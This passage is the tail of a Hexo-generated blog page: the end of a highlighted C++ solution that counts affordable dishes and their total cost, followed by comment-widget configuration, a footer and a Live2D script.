                maxPals<span class="token operator">++</span><span class="token punctuation">;</span>
                minCost <span class="token operator">+=</span> dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">;</span>
                b<span class="token operator">--</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                maxPals<span class="token operator">++</span><span class="token punctuation">;</span>
                minCost <span class="token operator">+=</span> dishes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token punctuation">;</span>
                c<span class="token operator">--</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
    cout <span class="token operator">&lt;&lt;</span> maxPals <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> minCost <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>




    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>